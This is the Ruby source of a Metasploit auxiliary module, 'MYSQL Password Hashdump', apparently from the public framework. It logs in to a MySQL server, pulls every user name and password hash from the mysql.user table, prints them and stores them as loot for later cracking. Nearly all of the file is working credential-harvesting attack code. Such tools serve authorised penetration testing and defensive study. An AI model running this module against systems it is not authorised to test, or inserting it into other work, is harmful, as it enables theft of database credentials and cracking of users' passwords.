##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'MYSQL Password Hashdump',
      'Description'    => %Q{
          This module extracts the usernames and encrypted password
        hashes from a MySQL server and stores them for later cracking.
      },
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)

    if (not mysql_login_datastore)
      return
    end

    #Grabs the username and password hashes and stores them as loot
    res = mysql_query("SELECT user,password from mysql.user")
    if res.nil?
      print_error("There was an error reading the MySQL User Table")
      return
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'mysql',
          :proto => 'tcp'
          )


    #create a table to store data
    tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'MysQL Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    if res.size > 0
      res.each do |row|
        tbl << [row[0], row[1]]
        print_good("Saving HashString as Loot: #{row[0]}:#{row[1]}")
      end
    end

    report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?


  end

  #Stores the Hash Table as Loot for Later Cracking
  def report_hashes(hash_loot,service)

    filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_mysqlhashes.txt"
    path = store_loot("mysql.hashes", "text/plain", datastore['RHOST'], hash_loot, filename, "MySQL Hashes",service)
    print_status("Hash Table has been saved: #{path}")

  end


end
